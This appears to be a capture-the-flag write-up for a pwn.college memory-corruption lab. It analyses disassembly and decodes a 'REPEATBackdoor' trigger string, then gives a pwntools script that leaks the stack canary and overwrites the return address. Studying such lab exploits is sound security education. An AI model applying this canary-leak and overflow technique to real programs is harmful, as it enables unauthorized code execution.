0x00005609a6523f1d <+1371>:  call   0x5609a65231b0 <read@plt>
```
```
0x000055add60bd0ec <+1834>:  mov    rax,QWORD PTR [rbp-0x48]
0x000055add60bd0f0 <+1838>:  mov    rsi,rax
0x000055add60bd0f3 <+1841>:  lea    rdi,[rip+0x23d5]        # 0x55add60bf4cf
0x000055add60bd0fa <+1848>:  mov    eax,0x0
0x000055add60bd0ff <+1853>:  call   0x55add60bc180 <printf@plt>
```

```
0x00005609a652411c <+1882>:  mov    rax,QWORD PTR [rbp-0x48]
0x00005609a6524120 <+1886>:  lea    rsi,[rip+0x2442]        # 0x5609a6526569
0x00005609a6524127 <+1893>:  mov    rdi,rax
0x00005609a652412a <+1896>:  call   0x5609a6523210 <strstr@plt>
0x00005609a652412f <+1901>:  test   rax,rax
0x00005609a6524132 <+1904>:  je     0x5609a6524157 <challenge+1941>
0x00005609a6524134 <+1906>:  lea    rdi,[rip+0x2435]        # 0x5609a6526570
0x00005609a652413b <+1913>:  call   0x5609a6523150 <puts@plt>
0x00005609a6524140 <+1918>:  mov    rdx,QWORD PTR [rbp-0x78]
0x00005609a6524144 <+1922>:  mov    rcx,QWORD PTR [rbp-0x70]
0x00005609a6524148 <+1926>:  mov    eax,DWORD PTR [rbp-0x64]
0x00005609a652414b <+1929>:  mov    rsi,rcx
0x00005609a652414e <+1932>:  mov    edi,eax
0x00005609a6524150 <+1934>:  call   0x5609a65239c2 <challenge>
0x00005609a6524155 <+1939>:  jmp    0x5609a6524168 <challenge+1958>
0x00005609a6524157 <+1941>:  lea    rdi,[rip+0x243c]        # 0x5609a652659a
0x00005609a652415e <+1948>:  call   0x5609a6523150 <puts@plt>
0x00005609a6524163 <+1953>:  mov    eax,0x0
0x00005609a6524168 <+1958>:  mov    rcx,QWORD PTR [rbp-0x8]
0x00005609a652416c <+1962>:  xor    rcx,QWORD PTR fs:0x28
0x00005609a6524175 <+1971>:  je     0x5609a652417c <challenge+1978>
0x00005609a6524177 <+1973>:  call   0x5609a6523170 <__stack_chk_fail@plt>
```
- As you see, the program has functionn **strstr()**, let's search about it.
    - char *strstr (const char *s1, const char *s2);
    -  This function returns a pointer point to the first character of the found s2 in s1 otherwise a null pointer if s2 is not present in s1.
    - If s2 points to an empty string, s1 is returned.
- In above code, the program check the return value of strstr() function, **If itsn't null pointer, will call challenge again(s2 appear in s1).**
- The special point is that the program will print what you input to it.
- However, you will overflow the canary on the stack before you can return the address you want. You must  bypass the canary.

---

**We have enough information, so we will make the decision to exploit the program.**
- The program allow you to call more than once.
- This also prints your input; if you write buf to the begining of the canary, the value canary can be leaked in the first run of the program.
- After you call the challenge function again, it is also in the same process, so the value of canary remains unchanged. If you have a value canary, you can overwrite the return address and exploit it successfully.
- After I run and debug the program several times, I notice that the byte at the end of the value canary is **00**. Thus, if you only connect buf and canary by filling the offset; you won't get the flag, you must overwrite one byte of canary to leak it.
 
**In conclusion, you leak the canary, by pass it and overwrite the return address**


---
## Find the string s2
- Because the program is file ELF 64 bit with an architecture of x86-64, according to [calling convention](https://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-and-user-space-f)
    - It take the first agrument in rdi and the next in rsi.
    - Look at code assembly; we can understand that it calls strstr(buf,const char* str). With buf is my input and str point to *0x5609a6526569*.
    - We will find the string at this.
```
(gdb) x/50gx 0x55add60bf569
0x55add60bf569: 0x4200544145504552      0x20726f6f646b6361
0x55add60bf579: 0x6572656767697274      0x6165706552202164
0x55add60bf589: 0x61686320676e6974      0x292865676e656c6c
0x55add60bf599: 0x657962646f6f4700      0x6e696474733c0021
0x55add60bf5a9: 0x3e2063677261003e      0x2300232323003020
0x55add60bf5b9: 0x6f636c6557202323      0x7325206f7420656d
```

```
from binascii import unhexlify

arr =   [0x45504552      ,0x42005441      ,0x646b6361      ,0x20726f6f
        ,0x67697274      ,0x65726567      ,0x52202164      ,0x61657065
        ,0x676e6974      ,0x61686320      ,0x6e656c6c      ,0x29286567
        ,0x6f6f4700      ,0x65796264      ,0x733c0021      ,0x6e696474
        ,0x7261003e      ,0x3e206367      ,0x23003020      ,0x23002323
        ,0x57202323      ,0x6f636c65      ,0x7420656d      ,0x7325206f]

# Initialize an empty list to store the decoded strings
decoded_strings = []

# Iterate over each hex value in the array
for i in range(len(arr)):
    # Convert the hex value to bytes and decode it
    decoded_string = unhexlify(hex(arr[i])[2:]).decode("utf-8")
    decoded_strings.append(decoded_string[::-1])

# Print the decoded strings
for s in decoded_strings:
    print(s, end='')
```
- After I run this code python, I get the input: 
**REPEATBackdoor triggered! Repeating challenge()Goodbye!<stdin>argc > 0###### Welcome to %s**
## Calcualte the offset and write script
- The offset is showed by the program, you can calculate it easily.
    - offset between buf and canary: 56
    - offset between buf and ret_addr: 72
    
**My script**
    
```
from pwn import *

while True:
    r = process('/challenge/babymem_level12.0')
    r.recvuntil(b'Payload size: ')
    r.sendline(b'57')
    r.recvuntil(b'Send your payload (up to 57 bytes)!')
    r.sendline(b'REPEATBackdoor' + b'A'*43)
    r.recvuntil(b'You said: REPEATBackdoorAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
    canary_rev = int(r.recvn(7).hex(), 16)
    canary_str = "0x" + bytes.fromhex(hex(canary_rev)[2:])[::-1].hex() + "00"
    canary = int(canary_str, 16)
    print(hex(canary))
    r.recvuntil(b'Payload size: ')
    r.sendline(b'74')
    r.recvuntil(b'Send your payload (up to 74 bytes)!')
    r.sendline(b'A'*56 + p64(canary) + b'A'*8  + 0x18ca.to_bytes(2, 'little'))
    result = r.recvall()
    r.close()
    if b'pwn.college{' in result:
        print(result.decode('utf-8', errors='ignore'))
        break
```